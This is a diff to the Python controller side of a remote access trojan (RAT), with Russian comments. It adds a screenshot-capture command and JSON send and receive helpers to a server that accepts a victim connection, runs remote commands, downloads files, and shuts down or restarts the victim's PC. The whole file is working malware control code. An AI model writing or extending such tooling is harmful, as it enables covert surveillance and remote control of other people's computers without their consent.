@@ -1,3 +1,4 @@
+from multiprocessing import connection
 import socket, json, base64
 
 # Set the commands as a 2D array with descriptions for modularity
@@ -11,6 +12,7 @@ commands = [
     ["shutdown", "Shutsdown the client users PC, will close connection"],
     ["restart", "Restarts the client users PC"],
     ["ratHelp", "Displays this list"],
+    ["screen", "makes screenshot"],
 ]
 
 def helpCommand():
@@ -26,12 +28,14 @@ def helpCommand():
 
 class Server:
     def __init__(self, ip, port):
+        self.in_procces = False
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((ip, port))
         server.listen(0)
         print("[+] Waiting for a connection")
         self.connection, address = server.accept()
+        self.tag = address
         print("[+] Connection received from " + str(address))
         helpCommand()
 
@@ -49,11 +53,11 @@ class Server:
         self.connection.send(jsonData.encode())
 
     def executeRemotely(self, command):
-        self.dataSend(command)
+        self.send_json(command)
         if command[0] == "exit":
             self.connection.close()
             exit()
-        return self.dataReceive()
+        return self.receive_json()
 
     def readFile(self, path):
         with open(path, "rb") as file:
@@ -63,6 +67,38 @@ class Server:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download complete"
+    
+    def screenshot(self, content):
+        with open("screen.png", "wb") as file:
+            file.write(base64.b64decode(content))
+        return ("[+] screen complete",)
+    
+    # Отправка json-данных клиенту
+    def send_json(self, data):     
+        # Обрабатываем бинарные данные
+        try: json_data = json.dumps(data.decode('utf-8'))
+        except: json_data = json.dumps(data)
+        
+        # В случае если клиент разорвал соединение но сервер отправляет команду
+        try:
+            self.connection.send(json_data.encode('utf-8')) 
+        except ConnectionResetError:
+            # Отключаемся от текущей сессии
+            self.connection = None
+
+
+    # Получаем json данные от клиента
+    def receive_json(self):
+        json_data = ''
+        while True:
+            try:
+                if self.connection != None:
+                    json_data += self.connection.recv(1024).decode('utf-8')
+                    return json.loads(json_data)
+                else: 
+                    return None
+            except ValueError:
+                pass
         
     def step(self, command):
         command = command.split(" ", 1)
@@ -73,6 +109,8 @@ class Server:
             result = self.executeRemotely(command)
             if command[0] == "download" and "[-] Error" not in result:
                 result = self.writeFile(command[1], result)
+            if command[0] == "screenshot" and "[-] Error" not in result:
+                result = self.screenshot(result)
             elif command[0] == "ratHelp":
                 result = helpCommand()
         except Exception:
